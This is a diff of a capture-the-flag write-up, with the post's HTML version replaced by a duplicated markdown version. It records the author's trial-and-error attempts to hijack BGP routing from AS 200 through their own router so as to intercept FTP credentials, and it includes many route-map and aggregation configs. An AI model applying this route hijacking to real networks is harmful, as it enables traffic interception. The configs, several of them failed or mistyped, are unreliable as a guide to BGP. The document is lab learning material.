-<p>neighbor castcom peer-group</p>
-
-<p><img src="docs-diagram.PNG" alt="docs-diagram" /></p>
-
-<p>It says i can effect external peer groups it says it can effect the update policies of other AS. which would be nice to shut as 300 up. there by making me the prefered path bauhahahahaa.</p>
-
-<h3 id="cidr-and-aggregate-addresses">CIDR and Aggregate Addresses</h3>
-
-<p>this sounds promising lol. bgpd4 over bgp3 offers cidr notation so like in the above diagram each of  the antonymous systems have aggregated route tables so as 300 broadcast 10.120.0.0/16 and as 200 10.100.0.0/16. i would like to note i saw it appended /21 interesting.</p>
-
-<p>what this does is propogates a supernet route to 10.120.0.0/16</p>
-
-<p>try1</p>
-
-<p>neighbor 10.99.64.2 remote-as 200</p>
-
-<p>neighbor 10.100.10.1 remote-as 200</p>
-
-<p>neighbor 10.120.15.1 remote-as 300</p>
-
-<p>network 10.120.0.0</p>
-
-<p>network 10.78.0.0</p>
-
-<p>aggregate-address 10.120.0.0 255.255.0.0</p>
-
-<p>try 2</p>
-
-<p>network 10.120.0.0 mask 255.255.0.0</p>
-
-<p>neighbor 10.100.10.1 remote-as 300</p>
-
-<p>neighbor 10.100.10.1 remote-as 200</p>
-
-<p>neighbor 10.120.15.1 remote-as 300</p>
-
-<p>redistribute static</p>
-
-<p>try3</p>
-
-<p>neighbor 10.120.15.1 remote-as 300</p>
-
-<p>aggregate 10.120.15.0 255.255.255.0 summary-only</p>
-
-<p>aggregate 10.120.15.0 255.255.255.0 as-set</p>
-
-<h2 id="route-map">ROUTE MAP</h2>
-
-<p>I&rsquo;m not sure why nothing i tried worked. This is how im going to get those creds. Using route map and metrics to change the route prefferences of as 200 to as 300. MEtrics can be used to change the path preferences of other autonomous systems.</p>
-
-<p>network 10.120.0.0</p>
-
-<p>neighbor 10.120.15.1 remote-as 300</p>
-
-<p>network 10.120.0.0</p>
-
-<p>route-map to-as200 permit 20</p>
-
-<p>set metric 5</p>
-
-<p>route-map to-as300 permit 10</p>
-
-<p>neighbor 10.120.15.1 remote-as 300</p>
-
-<p>network 10.120.15.0</p>
-
-<p>route-map to-as200 permit 20</p>
-
-<p>set metric 5</p>
-
-<p>route-map to-as300 permit 10</p>
-
-<p>set metric 2</p>
-
-<p>access-list 1 permit 10.120.0.0 0.0.255.255</p>
-
-<p>neighbor 10.120.15.1 remote-as 300</p>
-
-<p>network 10.120.0.0</p>
-
-<p>route-map to-as300 permit 10</p>
-
-<p>set metric 2</p>
-
-<p>route-map to-as200 permit 20</p>
-
-<p>set metric 5</p>
-
-<p>access-list 1 permit 10.120.0.0 0.0.255.255</p>
-
-<p>neighbor 10.120.15.2 remote-as 300</p>
-
-<p>network 10.120.0.0</p>
-
-<p>route-map to-as200 permit 10</p>
-
-<p>set metric 2</p>
-
-<p>route-map to-as300 permit 20</p>
-
-<p>set metric 5</p>
-
-<p>access-list 1 permit 10.120.0.0 0.0.255.255</p>
-
-<p>try 6</p>
-
-<pre><code>neighbor 10.120.15.1 remote-as 300 
-network 10.120.15.0 
-</code></pre>
-
-<pre><code>neighbor 10.100.10.1 remote-as 200 
-</code></pre>
-
-<pre><code>route-map to-as200 permit 20
-match as-path 1
-set metric 2
-</code></pre>
-
-<pre><code>route-map to-as300 permit 10
-match as-path 1
-set weight 20
-</code></pre>
-
-<pre><code>ip as-path access-list 1 permit ^300$
-ip as-path access-list 1 permit ^100$
-</code></pre>
-
-<h3 id="bgpd-conf">bgpd.conf</h3>
-
-<pre><code>router bgp 100                                                                                                                       
- bgp router-id 10.255.255.1                                                                                                          
- network 10.101.8.0/21                                                                                                               
- network 10.101.16.0/21                                                                                                              
- redistribute connected                                                                                                              
- neighbor 10.78.10.2 remote-as 200                                                                                                   
- neighbor 10.78.11.2 remote-as 300                                                                                                   
- neighbor 10.78.10.2 route-map to-as200 out                                                                                          
- neighbor 10.78.11.2 route-map to-as300 out
-</code></pre>
-
-<pre><code>neighbor 10.78.11.2 remote-as 300
-network 10.120.0.0
-This part changes 
-neighbor 10.78.10.2 route-map to-as200 in
-neighbor 10.78.11.2 route-map to-as300 in
-
-route-map to-as200 permit 10
-set metric 2
-
-route-map to-as300 permit 20
-set metric 5
-
-access-list 1 permit 10.120.0.0 0.0.255.255
-</code></pre>
-
-<p>The bgpd.conf file already has an entry for route-map to-as300 permit 10, something to note when you write to the conf file form terminal it will auto arrange the file to the correct format. i had the password at the bottom from the append.</p>
-
-<hr />
+<p>network 10.120.15.0 mask 255.255.255.0</p>
 
 <pre><code>
+##  AS_PATH 
+
+attribute is the list of as number a route has traversed to its destination for as 100 to talk to as 300 it goes through as 200. when it arrives at 300 it looks like 10.120.0.0(300,200) it inverts the as's to know how to get back. note 
+
+![route2](https://chickenpwny.github.io/images/carrier/route2.PNG)
+
+## Next hop attribute
+
+Ebgp whats used for AS to route in between other ASs. This allows you to spefify the next hop is within that AS. so you can switch over to ibgp and talk to the next router inside there. hmmm interesting. i dont think its applicaable to this ctf as each of the target routers are in different AS. 
+
+BGP Backdoor
+
+eBGP has a distance of 20
+
+distance bgp *external-distance internal-distance local-distance*
+
+distance bgp 20
+
+AS 200 routes directly to AS 300 because thats the shortest path and there for preferred. I want it to go 200 to 100 to 300. distance bgp command to edit the prefered route. this is what i need to get ftp creds. This may not be the way im not sure what kind of internal gateway protocol is being used. Nevermind found it![igp](https://chickenpwny.github.io/images/carrier/igp.PNG)
+
+one thing that makes this option finicky is that i dont have access to internal gateway protocol. I can only us router bgp. Based on my understand I should be able to bypass this by using the backdoor command. 
+
+
+
+neighbor 10.120.15.1 remote-as 300
+
+network 10.120.15.1 backdoor
+
+fail
+
+## Synchronization
+
+
+
+network 10.100.0.0
+
+neighbor 10.120.15.10 remote-as 300
+
+NOTE: This is all about ebgp
+
+no synchronization
+
+## Weight Attributes
+
+Weight attributes os a cisco-defined attribute hmm. This effects how the router will handle priority with routes. Other paths have a default of zero. Weights range from 0 to 65,535 Default is 32768 (sh ip bgp). routes with higher weights have preference. I don't have access to the router to effect theses changes. which is why i think the attemp with editing the weight attribute failed. This is used when you have two equally awesome routes to take and you need to chooses the preferred way. FOR YOUR ROUTER. forted again. 
+
+.https://www.cisco.com/c/en/us/support/docs/ip/border-gateway-protocol-bgp/26634-bgp-toc.html#howbgpwork
+
+
+
+![metric](https://chickenpwny.github.io/images/carrier/metric.PNG)
+
+neighbor 10.120.0.0 remote-as 300         
+
+neighbor 10.100.0.0 remote-as 200
+
+neighbor 10.120.0.0 weight 200
+
+neighbor 10.100.0.0 weight 400
+
+## [METRIC Attributes.](**https://www.cisco.com/c/en/us/support/docs/ip/border-gateway-protocol-bgp/26634-bgp-toc.html#howbgpwork**)
+
+If there are two routers in the same autonoymous system using the mtric attribute will halp external neighbors know which is the prefered path to take. This is a IGBP not really what im looking for. upong rereading about metrics i found this
+
+ &quot;The attribute provides a dynamic way to influence another AS in the way 
+to reach a certain route when there are multiple entry points into that 
+AS. A lower metric value is preferred more.
+
+ Unlike local preference, metric is exchanged between ASs. A metric is carried into an AS but does not leave the AS. When an update enters the AS with a certain metric, that metric is used to make decisions inside the AS. When the same update passes on to a third AS, that metric returns to 0. The diagram in this section shows the set of metric. The metric default value is 0.&quot;
+
+So using route maps i could changes the preferences of as 200
+
+
+
+## [ROUTE FILTERING](https://www.cisco.com/c/en/us/support/docs/ip/border-gateway-protocol-bgp/26634-bgp-toc.html#howbgpwork)
+
+Not it either this is used when you want to stop the propogation of route to another autonoymous system. fudge
+
+https://www.cisco.com/c/en/us/support/docs/ip/border-gateway-protocol-bgp/26634-bgp-toc.html#asregexp
+
+## Well Well Well PEERGROUPS
+
+https://www.cisco.com/c/en/us/support/docs/ip/border-gateway-protocol-bgp/26634-bgp-toc.html#asregexp
+
+After reading about peergroups the image form docs makes a little more sense.
+
+neighbor castcom peer-group
+
+![docs-diagram](docs-diagram.PNG)
+
+It says i can effect external peer groups it says it can effect the update policies of other AS. which would be nice to shut as 300 up. there by making me the prefered path bauhahahahaa.
+
+### CIDR and Aggregate Addresses
+
+this sounds promising lol. bgpd4 over bgp3 offers cidr notation so like in the above diagram each of  the antonymous systems have aggregated route tables so as 300 broadcast 10.120.0.0/16 and as 200 10.100.0.0/16. i would like to note i saw it appended /21 interesting.
+
+what this does is propogates a supernet route to 10.120.0.0/16
+
+try1
+
+neighbor 10.99.64.2 remote-as 200                 
+
+neighbor 10.100.10.1 remote-as 200             
+
+neighbor 10.120.15.1 remote-as 300                        
+
+network 10.120.0.0                                           
+
+network 10.78.0.0                                 
+
+aggregate-address 10.120.0.0 255.255.0.0
+
+try 2
+
+network 10.120.0.0 mask 255.255.0.0
+
+neighbor 10.100.10.1 remote-as 300
+
+neighbor 10.100.10.1 remote-as 200
+
+neighbor 10.120.15.1 remote-as 300
+
+redistribute static
+
+try3
+
+neighbor 10.120.15.1 remote-as 300
+
+aggregate 10.120.15.0 255.255.255.0 summary-only
+
+aggregate 10.120.15.0 255.255.255.0 as-set
+
+## ROUTE MAP
+
+I'm not sure why nothing i tried worked. This is how im going to get those creds. Using route map and metrics to change the route prefferences of as 200 to as 300. MEtrics can be used to change the path preferences of other autonomous systems.
+
+
+
+network 10.120.0.0 
+
+neighbor 10.120.15.1 remote-as 300
+
 network 10.120.0.0
-
-neighbor 10.78.10.2 route-map to-as200 in
-neighbor 10.78.11.2 route-map to-as300 in
-
-route-map to-as300 permit 20
-set metric 2
-
-access-list 1 permit 10.120.15.0 0.0.0.255
-
-set weight instead of metric weight doesn't work again because it only 
-affects the local router.
-
-network 10.120.0.0
-
-neighbor 10.78.10.2 route-map to-as200 in
-neighbor 10.78.11.2 route-map to-as300 in
-
-ip as-path access-list 5 permit ^300$
-
-route-map to-as100 permit 10
-set metric 50000
-
-route-map tp-as300 permit 20 
-set metric 30000
-
-you cannot effect other autonomous systems metrics unless you specify bgp always-compare-med 
-
-network 10.120.0.0
-
-neighbor 10.78.10.2 route-map to-as200 in
-neighbor 10.78.11.2 route-map to-as300 in
-
-route-map to-as100 permit 10
-set metric 50000
-
-route-map tp-as300 permit 20 
-set metric 30000
-
-ip as-path access-list 5 permit ^300$
-</code></pre>
-
-<p>to affect other autonomous system metrics  bgp always-compare-med. wooolol</p>
-
-<pre><code>bgp always-compare-med
-
-neighbor 10.78.10.2 route-map to-as200 in
-neighbor 10.78.11.2 route-map to-as300 in
 
 route-map to-as200 permit 20
+
+set metric 5
+
+route-map to-as300 permit 10
+
+
+
+neighbor 10.120.15.1 remote-as 300 
+
+network 10.120.15.0 
+
+route-map to-as200 permit 20
+
+set metric 5
+
+route-map to-as300 permit 10
+
+set metric 2
+
+access-list 1 permit 10.120.0.0 0.0.255.255
+
+
+
+neighbor 10.120.15.1 remote-as 300 
+
+network 10.120.0.0 
+
+route-map to-as300 permit 10
+
+set metric 2
+
+route-map to-as200 permit 20
+
+set metric 5
+
+access-list 1 permit 10.120.0.0 0.0.255.255
+
+
+
+neighbor 10.120.15.2 remote-as 300 
+
+network 10.120.0.0 
+
+route-map to-as200 permit 10
+
+set metric 2
+
+route-map to-as300 permit 20
+
+set metric 5
+
+access-list 1 permit 10.120.0.0 0.0.255.255
+
+try 6
+
+</code></pre>
+
+<p>neighbor 10.120.15.1 remote-as 300
+network 10.120.15.0</p>
+
+<pre><code>
+</code></pre>
+
+<p>neighbor 10.100.10.1 remote-as 200</p>
+
+<pre><code>
+</code></pre>
+
+<p>route-map to-as200 permit 20
+match as-path 1
+set metric 2</p>
+
+<pre><code>
+</code></pre>
+
+<p>route-map to-as300 permit 10
+match as-path 1
+set weight 20</p>
+
+<pre><code>
+</code></pre>
+
+<p>ip as-path access-list 1 permit ^300$
+ip as-path access-list 1 permit ^100$</p>
+
+<pre><code>
+### bgpd.conf
+
+</code></pre>
+
+<p>router bgp 100<br />
+ bgp router-id 10.255.255.1<br />
+ network 10.101.8.0/21<br />
+ network 10.101.16.0/21<br />
+ redistribute connected<br />
+ neighbor 10.78.10.2 remote-as 200<br />
+ neighbor 10.78.11.2 remote-as 300<br />
+ neighbor 10.78.10.2 route-map to-as200 out<br />
+ neighbor 10.78.11.2 route-map to-as300 out</p>
+
+<pre><code>
+</code></pre>
+
+<p>neighbor 10.78.11.2 remote-as 300
+network 10.120.0.0
+This part changes
+neighbor 10.78.10.2 route-map to-as200 in
+neighbor 10.78.11.2 route-map to-as300 in</p>
+
+<p>route-map to-as200 permit 10
+set metric 2</p>
+
+<p>route-map to-as300 permit 20
+set metric 5</p>
+
+<p>access-list 1 permit 10.120.0.0 0.0.255.255</p>
+
+<pre><code>
+The bgpd.conf file already has an entry for route-map to-as300 permit 10, something to note when you write to the conf file form terminal it will auto arrange the file to the correct format. i had the password at the bottom from the append. 
+
+****
+
+</code></pre>
+
+<p>network 10.120.0.0</p>
+
+<p>neighbor 10.78.10.2 route-map to-as200 in
+neighbor 10.78.11.2 route-map to-as300 in</p>
+
+<p>route-map to-as300 permit 20
+set metric 2</p>
+
+<p>access-list 1 permit 10.120.15.0 0.0.0.255</p>
+
+<p>set weight instead of metric weight doesn&rsquo;t work again because it only
+affects the local router.</p>
+
+<p>network 10.120.0.0</p>
+
+<p>neighbor 10.78.10.2 route-map to-as200 in
+neighbor 10.78.11.2 route-map to-as300 in</p>
+
+<p>ip as-path access-list 5 permit ^300$</p>
+
+<p>route-map to-as100 permit 10
+set metric 50000</p>
+
+<p>route-map tp-as300 permit 20
+set metric 30000</p>
+
+<p>you cannot effect other autonomous systems metrics unless you specify bgp always-compare-med</p>
+
+<p>network 10.120.0.0</p>
+
+<p>neighbor 10.78.10.2 route-map to-as200 in
+neighbor 10.78.11.2 route-map to-as300 in</p>
+
+<p>route-map to-as100 permit 10
+set metric 50000</p>
+
+<p>route-map tp-as300 permit 20
+set metric 30000</p>
+
+<p>ip as-path access-list 5 permit ^300$</p>
+
+<pre><code>
+to affect other autonomous system metrics  bgp always-compare-med. wooolol
+
+</code></pre>
+
+<p>bgp always-compare-med</p>
+
+<p>neighbor 10.78.10.2 route-map to-as200 in
+neighbor 10.78.11.2 route-map to-as300 in</p>
+
+<p>route-map to-as200 permit 20
 set metric 5
 route-map to-as300 permit 10
-set metric 2
+set metric 2</p>
 
-access-list 1 permit 10.120.0.0 0.0.255.255
+<p>access-list 1 permit 10.120.0.0 0.0.255.255</p>
+
+<pre><code>
+Next note permit references references different route maps incomming or out going routes. if the first map fail proceed to a higher instance of the route map
 
 </code></pre>
 
-<p>Next note permit references references different route maps incomming or out going routes. if the first map fail proceed to a higher instance of the route map</p>
-
-<pre><code>bgp always-compare-med
+<p>bgp always-compare-med
 bgp dampening
 neighbor 10.120.15.1 remote-as 300
-network 10.120.0.0
+network 10.120.0.0</p>
 
-neighbor 10.78.10.2 route-map to-as200 in
+<p>neighbor 10.78.10.2 route-map to-as200 in
 neighbor 10.78.11.2 route-map to-as300 in
 route-map to-as200 permit 20
 route-map to-as300 permit 20
-set metric 2
+set metric 2</p>
 
-access-list 1 permit 10.120.0.0 0.0.255.255
+<p>access-list 1 permit 10.120.0.0 0.0.255.255</p>
+
+<pre><code>
 </code></pre>
 
-<pre><code>bgp always-compare-med
+<p>bgp always-compare-med
 bgp dampening
 neighbor 10.120.15.1 remote-as 300
-network 10.120.0.0
+network 10.120.0.0</p>
 
-neighbor 10.78.10.2 route-map to-as200 in
+<p>neighbor 10.78.10.2 route-map to-as200 in
 neighbor 10.78.11.2 route-map to-as300 in
 route-map to-as200 permit 20
 set metric 5
 route-map to-as300 permit 20
-set metric 2
+set metric 2</p>
 
-access-list 1 permit 10.120.0.0 0.0.255.255
+<p>access-list 1 permit 10.120.0.0 0.0.255.255</p>
+
+<pre><code>
 </code></pre>
 
-<pre><code>bgp always-compare-med
-network 10.120.15.0
+<p>bgp always-compare-med
+network 10.120.15.0</p>
 
-neighbor 10.78.10.1 route-map to-as200 in
+<p>neighbor 10.78.10.1 route-map to-as200 in
 neighbor 10.78.11.1 route-map to-as300 in
 route-map to-as200 permit 20
 set metric 5
 route-map to-as300 permit 20
 match as-path 1
-set metric 2
+set metric 2</p>
 
-access-list 1 permit 10.120.15.0 0.0.255.255
+<p>access-list 1 permit 10.120.15.0 0.0.255.255</p>
+
+<pre><code>
+try adding a match as-path1
+
 </code></pre>
 
-<p>try adding a match as-path1</p>
-
-<pre><code>router bgp 100
+<p>router bgp 100
 bgp always-compare-med
 network 10.120.15.0
-neighbor 10.120.15.1 remote-as 300
+neighbor 10.120.15.1 remote-as 300</p>
 
-neighbor 10.78.10.1 route-map to-as200 in
+<p>neighbor 10.78.10.1 route-map to-as200 in
 neighbor 10.78.11.1 route-map to-as300 in
 route-map to-as200 permit 20
 set metric 5
 route-map to-as300 permit 20
 match as-path 1
-set metric 5
+set metric 5</p>
 
-ip as-path access-list 1 permit ^300$
+<p>ip as-path access-list 1 permit ^300$</p>
+
+<pre><code>
+perhaps ive been over complicating thing.
+
 </code></pre>
 
-<p>perhaps ive been over complicating thing.</p>
-
-<pre><code>route-map to-as200 permit 20
+<p>route-map to-as200 permit 20
 set metric 100
 route-map to-as300 permit 10
 set metric 1
 wr
 router bgp 100
-network 10.120.15.10
+network 10.120.15.10</p>
+
+<pre><code>
 </code></pre>
 
-<pre><code>conf t
+<p>conf t
 router bgp 100
 bgp always-compare-med
 route-map to-as200 permit 20
@@ -1757,107 +1854,119 @@ neighbor 10.78.10.2 route-map to-as200 in
 neighbor 10.78.11.2 route-map to-as300 in
 wr
 router bgp 100
-network 10.120.15.10
+network 10.120.15.10</p>
+
+<pre><code>
+as200 is problably configured with bgp bestpath as-path ignore whichs will force it to go to the sportest path presented to it. If it not on the system it would install 10.120.0.0 from as 300 i believe maybe. I'd also like to note that i might have been using the metric atribute wrong. it goes from 200 to 0 0 being default and 1 being preferred over 200. 
+
+So if i set the metric for to-as300 to 200 it would be the last route, because the default path is 0 which would make as100 lowest would make my path preferred. 
+
+while not applicable router compares metrics in the same AS first before other AS that might give those higher path preference.
+
+i dont think i need to add bpg always-compare-med to my commands because it needs to be configured on to-as200. to accept the changes in the first places
+
+default-metric to set local metrics
 
 </code></pre>
 
-<p>as200 is problably configured with bgp bestpath as-path ignore whichs will force it to go to the sportest path presented to it. If it not on the system it would install 10.120.0.0 from as 300 i believe maybe. I&rsquo;d also like to note that i might have been using the metric atribute wrong. it goes from 200 to 0 0 being default and 1 being preferred over 200.</p>
-
-<p>So if i set the metric for to-as300 to 200 it would be the last route, because the default path is 0 which would make as100 lowest would make my path preferred.</p>
-
-<p>while not applicable router compares metrics in the same AS first before other AS that might give those higher path preference.</p>
-
-<p>i dont think i need to add bpg always-compare-med to my commands because it needs to be configured on to-as200. to accept the changes in the first places</p>
-
-<p>default-metric to set local metrics</p>
-
-<pre><code>router bgp 100
+<p>router bgp 100
 network 10.120.0.0
 neighbor 10.78.10.2 route-map to-as200 in
-neighbor 10.78.11.2 route-map to-as300 in
+neighbor 10.78.11.2 route-map to-as300 in</p>
 
-route-map to-as200 permit 20
+<p>route-map to-as200 permit 20</p>
 
-route-map to-as300 permit 10
+<p>route-map to-as300 permit 10
 match as-path 1
 set metric 200
 wr
-ip as-path access-list 1 permit ^300$
+ip as-path access-list 1 permit ^300$</p>
+
+<pre><code>
+trying to uses the other 
+
 </code></pre>
 
-<p>trying to uses the other</p>
-
-<pre><code>router bgp 100
+<p>router bgp 100
 network 10.120.0.0
 neighbor 10.78.11.2 route-map to-as100 in
 neighbor 10.78.10.2 route-map to-as200 in
-neighbor 10.78.11.2 route-map to-as300 in
+neighbor 10.78.11.2 route-map to-as300 in</p>
 
-route-map to-as200 permit 20
+<p>route-map to-as200 permit 20</p>
 
-route-map to-as300 permit 10
+<p>route-map to-as300 permit 10
 match as-path 1
 set metric 200
 wr
-ip as-path access-list 1 permit ^300$
+ip as-path access-list 1 permit ^300$</p>
+
+<pre><code>
+trying to aggregate the address
+
 </code></pre>
 
-<p>trying to aggregate the address</p>
-
-<pre><code>router bgp 100
+<p>router bgp 100
 network 10.78.0.0
 aggredate-address 10.120.0.0 255.255.0.0
 neighbor 10.78.10.2 route-map to-as200 in
-neighbor 10.78.11.2 route-map to-as300 in
+neighbor 10.78.11.2 route-map to-as300 in</p>
 
-route-map to-as200 permit 20
+<p>route-map to-as200 permit 20</p>
 
-route-map to-as300 permit 10
+<p>route-map to-as300 permit 10
 match as-path 1
 set metric 200
 wr
-ip as-path access-list 1 permit ^300$
+ip as-path access-list 1 permit ^300$</p>
+
+<pre><code>
 </code></pre>
 
-<pre><code>router bgp 100
+<p>router bgp 100
 aggregate-address 10.120.0.0 255.255.0.0
-neighbor 10.78.10.2 route-map to-as200 in
+neighbor 10.78.10.2 route-map to-as200 in</p>
 
-route-map to-as200 permit 20
+<p>route-map to-as200 permit 20</p>
 
-route-map to-as300 permit 10
+<p>route-map to-as300 permit 10
 match as-path 1
 set metric 200
 wr
-ip as-path access-list 1 permit ^300$
+ip as-path access-list 1 permit ^300$</p>
+
+<pre><code>
+the former seems to cluttered to be the answer.
 
 </code></pre>
 
-<p>the former seems to cluttered to be the answer.</p>
-
-<pre><code>router bgp 100
+<p>router bgp 100
 aggregate-address 10.120.15.0 255.255.0.0
 neighbor 10.78.10.2 route-map to-as200 in
-neighbor 10.78.11.2 route-map to-as300 in
+neighbor 10.78.11.2 route-map to-as300 in</p>
 
-route-map to-as200 permit 20
+<p>route-map to-as200 permit 20</p>
 
-route-map to-as300 permit 10
+<p>route-map to-as300 permit 10
 set metric 200
 exit
-wr
+wr</p>
 
-cp bgpd.conf.orig bgpd.conf
+<p>cp bgpd.conf.orig bgpd.conf</p>
+
+<pre><code>
+this time use the aggregate attribute-map
+
+you need need to add network 10.120.0.0 so that as100 annouces it has the route to as300. arg 
+
 </code></pre>
 
-<p>this time use the aggregate attribute-map</p>
+<p>aggregate-address 160.0.0.0 255.0.0.0 attribute-map SETORIGIN</p>
 
-<p>you need need to add network 10.120.0.0 so that as100 annouces it has the route to as300. arg</p>
-
-<pre><code>aggregate-address 160.0.0.0 255.0.0.0 attribute-map SETORIGIN
+<pre><code>
 </code></pre>
 
-<pre><code>conf t
+<p>conf t
 clear ip bgp
 router bgp 100
 default-metric 100
@@ -1866,283 +1975,298 @@ aggregate-address 10.120.15.0 255.255.255.0 suppress-map to-as300
 neighbor 10.78.10.1 route-map to-as200 in
 neighbor 10.78.10.2 route-map to-as200 out
 neighbor 10.78.11.1 route-map to-as300 in
-neighbor 10.78.11.2 route-map to-as300 out
+neighbor 10.78.11.2 route-map to-as300 out</p>
 
-route-map to-as200 permit 20
+<p>route-map to-as200 permit 20
 match as-path 1
 set weight 100
 route-map to-as300 permit 10
 match as-path 2
-set metric 200
+set metric 200</p>
 
-exit
-wr
+<p>exit
+wr</p>
 
-cp bgpd.conf.orig bgpd.conf
+<p>cp bgpd.conf.orig bgpd.conf</p>
+
+<pre><code>
 </code></pre>
 
-<pre><code>clear ip bgp *
+<p>clear ip bgp *
 conf t
 router bgp 100
-network 10.120.15.0
+network 10.120.15.0</p>
 
-aggregate-address 10.120.15.0 255.255.255.0
+<p>aggregate-address 10.120.15.0 255.255.255.0
 neighbor 10.78.10.2 remote-as 200
 neighbor 10.78.10.2 route-map to-as200 in
 neighbor 10.78.10.2 route-map to-as200 out
 neighbor 10.78.11.2 remote-as 200
 neighbor 10.78.11.2 route-map to-as300 in
-neighbor 10.78.11.2 route-map to-as300 out
+neighbor 10.78.11.2 route-map to-as300 out</p>
 
-route-map to-as200 permit 20
+<p>route-map to-as200 permit 20
 match as-path 1
 route-map to-as300 permit 10
 set metric 200
-exit
+exit</p>
 
-
-ip as-path access-list 1 permit .*
+<p>ip as-path access-list 1 permit .*
 ip as-path access-list 2 permit .*
-wr 
+wr</p>
 
-cp bgpd.conf.orig bgpd.conf
+<p>cp bgpd.conf.orig bgpd.conf</p>
+
+<pre><code>
 </code></pre>
 
-<pre><code>clear ip bgp *
+<p>clear ip bgp *
 conf t
 router bgp 100
-network 10.120.15.0
+network 10.120.15.0</p>
 
-aggregate-address 10.120.15.0 255.255.255.0
+<p>aggregate-address 10.120.15.0 255.255.255.0
 neighbor 10.78.10.2 remote-as 200
 neighbor 10.78.11.2 remote-as 300
 neighbor 10.78.10.2 route-map to-as200 in
-neighbor 10.78.11.2 route-map to-as300 out
+neighbor 10.78.11.2 route-map to-as300 out</p>
 
-route-map to-as200 permit 20
+<p>route-map to-as200 permit 20
 match as-path 1
 route-map to-as300 permit 20
 match as-path 2
 set metric 200
-exit
+exit</p>
 
-ip as-path access-list 1 permit .*
+<p>ip as-path access-list 1 permit .*
 ip as-path access-list 2 permit .*
-wr 
+wr</p>
 
-cp bgpd.conf.orig bgpd.conf
+<p>cp bgpd.conf.orig bgpd.conf</p>
+
+<pre><code>
+id like to take a moment to review what sh ip bgp is outputting
+
+to get to 300 i go to 200 then 300, i dont want this 
+
+![analyzzeee](https://chickenpwny.github.io/images/carrier/analyzzeee.PNG)
+
+this is almost what i want to get to 200 i got to 300 then 200
+
+on 10.78.10.2 there are no hopes which is what i believe i want. 
+
+for me to get too 20 i have to go 300 to 200. I want to keep 10.78.11.2 chan
+
+im not sure the original bgpd.conf only allows one path to get to as300. when i make my changes  i have multiple paths which while i made my changes it could still allow the default path. 
+
+![analyzzeee2](https://chickenpwny.github.io/images/carrier/analyzzeee2.PNG)
+
+&quot;You can use the set as-path prepend command in order to prepend path numbers to your updates and make the path length look longer. But, with attributes such as local preference, metric, or weight, AS400 can have set the exit point to be AS200. In this case, there is nothing that you can do. &quot;
+
 </code></pre>
 
-<p>id like to take a moment to review what sh ip bgp is outputting</p>
-
-<p>to get to 300 i go to 200 then 300, i dont want this</p>
-
-<p><img src="https://chickenpwny.github.io/images/carrier/analyzzeee.PNG" alt="analyzzeee" /></p>
-
-<p>this is almost what i want to get to 200 i got to 300 then 200</p>
-
-<p>on 10.78.10.2 there are no hopes which is what i believe i want.</p>
-
-<p>for me to get too 20 i have to go 300 to 200. I want to keep 10.78.11.2 chan</p>
-
-<p>im not sure the original bgpd.conf only allows one path to get to as300. when i make my changes  i have multiple paths which while i made my changes it could still allow the default path.</p>
-
-<p><img src="https://chickenpwny.github.io/images/carrier/analyzzeee2.PNG" alt="analyzzeee2" /></p>
-
-<p>&ldquo;You can use the set as-path prepend command in order to prepend path numbers to your updates and make the path length look longer. But, with attributes such as local preference, metric, or weight, AS400 can have set the exit point to be AS200. In this case, there is nothing that you can do. &ldquo;</p>
-
-<pre><code>clear ip bgp *
+<p>clear ip bgp *
 conf t
 router bgp 100
-network 10.120.15.0
+network 10.120.15.0</p>
 
-aggregate-address 10.120.15.0 255.255.255.0
+<p>aggregate-address 10.120.15.0 255.255.255.0
 neighbor 10.78.10.2 remote-as 200
 neighbor 10.78.11.2 remote-as 300
 neighbor 10.78.10.2 route-map to-as200 out
-neighbor 10.78.11.2 route-map to-as300 in
+neighbor 10.78.11.2 route-map to-as300 in</p>
 
-route-map to-as200 permit 20
+<p>route-map to-as200 permit 20
 match as-path 1
 set metric 200
 route-map to-as300 permit 10
 match as-path 2
 set metric 100
-exit
+exit</p>
 
-ip as-path access-list 1 permit .*
+<p>ip as-path access-list 1 permit .*
 ip as-path access-list 2 permit .*
-wr 
+wr</p>
 
-cp bgpd.conf.orig bgpd.conf
+<p>cp bgpd.conf.orig bgpd.conf</p>
+
+<pre><code>
+change permit attribute to-as200 to 10 it could take up to ten ssecond for a update to occur in this enviroment.
+
+network 10.120.15.0/24
+
+![analyzzeee4](https://chickenpwny.github.io/images/carrier/analyzzeee4.PNG)
+
 </code></pre>
 
-<p>change permit attribute to-as200 to 10 it could take up to ten ssecond for a update to occur in this enviroment.</p>
+<p>clear ip bgp 10.78.10.2
+clear ip bgp 10.78.11.2</p>
 
-<p>network 10.120.15.0/24</p>
-
-<p><img src="https://chickenpwny.github.io/images/carrier/analyzzeee4.PNG" alt="analyzzeee4" /></p>
-
-<pre><code>clear ip bgp 10.78.10.2
-clear ip bgp 10.78.11.2
-
-conf t
+<p>conf t
 router bgp 100
-network 10.0.0.0
+network 10.0.0.0</p>
 
-aggregate-address 10.0.0.0 255.255.255.0
+<p>aggregate-address 10.0.0.0 255.255.255.0</p>
 
-neighbor 10.78.10.2 remote-as 200
+<p>neighbor 10.78.10.2 remote-as 200
 neighbor 10.78.11.2 remote-as 300
 neighbor 10.78.10.2 route-map to-as200 in
-neighbor 10.78.11.2 route-map to-as300 out
+neighbor 10.78.11.2 route-map to-as300 out</p>
 
-route-map to-as200 permit 20
+<p>route-map to-as200 permit 20
 match as-path 1
 set metric 130
 exit
 route-map to-as300 permit 20
 match as-path 1
-set metric 150
+set metric 150</p>
 
-ip as-path access-list 1 permit ^200$
+<p>ip as-path access-list 1 permit ^200$
 ip as-path access-list 1 deny ^300$
-wr 
+wr
 end
-sh ip bgp
+sh ip bgp</p>
 
-cp bgpd.conf.orig bgpd.conf
+<p>cp bgpd.conf.orig bgpd.conf</p>
+
+<pre><code>
+
+
 </code></pre>
 
-<pre><code>clear ip bgp 10.78.10.2
-clear ip bgp 10.78.11.2
+<p>clear ip bgp 10.78.10.2
+clear ip bgp 10.78.11.2</p>
 
-conf t
+<p>conf t
 router bgp 100
-network 10.120.15.0/24
+network 10.120.15.0/24</p>
 
-route-map to-as200 permit 20
+<p>route-map to-as200 permit 20
 match as-path 1
 set metric 110
 exit
 route-map to-as300 permit 10
 match as-path 2
-set metric 120
+set metric 120</p>
 
-ip as-path access-list 1 deny ^300$
+<p>ip as-path access-list 1 deny ^300$
 ip as-path access-list 2 deny ^200$
-wr 
-end
 wr
+end
+wr</p>
 
+<p>sh ip bgp</p>
 
-sh ip bgp
+<p>cp bgpd.conf.orig bgpd.conf</p>
 
-cp bgpd.conf.orig bgpd.conf
+<pre><code>
+![analyzzeee5](https://chickenpwny.github.io/images/carrier/analyzzeee5.PNG)
+
